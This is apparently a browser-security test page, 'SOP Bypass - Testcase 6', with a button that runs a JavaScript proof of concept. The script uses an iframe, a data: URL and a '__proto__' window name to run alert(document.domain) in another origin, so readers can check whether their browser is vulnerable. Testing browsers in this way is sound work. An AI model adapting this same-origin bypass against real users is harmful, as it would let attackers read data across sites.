---
layout: default
title: SOP Bypass - Testcase 6
permalink: /sop/new/6
---

# SOP Bypass - Testcase 6

<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="sop()">
<script>
function sop() {
    frame = document.body.appendChild(document.createElement("iframe"));
    frame.src = "https://web.archive.org/web/20180831120255/http://www.bing.com";
    frame.onload = function() {
        frame.onload = null;
        frame.contentWindow[0].location = "data:text/html,<script>" + function() {
            window.name = "__proto__";
            parent.__proto__.alert.constructor("alert(document.domain)")();
        } + ")()</script>";
    }
}
</script>

**Note:**
If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass.
